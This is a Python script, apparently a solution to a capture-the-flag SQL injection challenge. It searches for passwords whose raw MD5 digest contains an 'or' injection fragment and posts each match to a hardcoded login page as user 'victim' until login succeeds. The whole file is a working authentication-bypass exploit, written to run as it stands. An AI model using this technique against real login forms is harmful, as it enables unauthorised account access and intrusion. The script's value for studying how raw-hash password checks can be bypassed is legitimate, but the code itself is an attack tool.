import hashlib
import requests
import itertools
import string

TARGET = "https://elecos432.org/sqlinject2/"

def raw_md5(s):
    return hashlib.md5(s.encode()).digest()

def is_injectable(d):
    for i in range(1, 10):
        if f"'or'{i}".encode() in d or f"'||'{i}".encode() in d:
            return True
    return False

chars = string.ascii_lowercase + string.digits
for length in range(1, 9):
    for tup in itertools.product(chars, repeat=length):
        password = "".join(tup)
        d = raw_md5(password)
        if is_injectable(d):
            print(f"Found: {password}, hex: {d.hex()}")
            r = requests.post(TARGET, data={"username": "victim", "password": password})
            if "successful" in r.text.lower():
                print("SUCCESS!", r.text[:300])
                exit()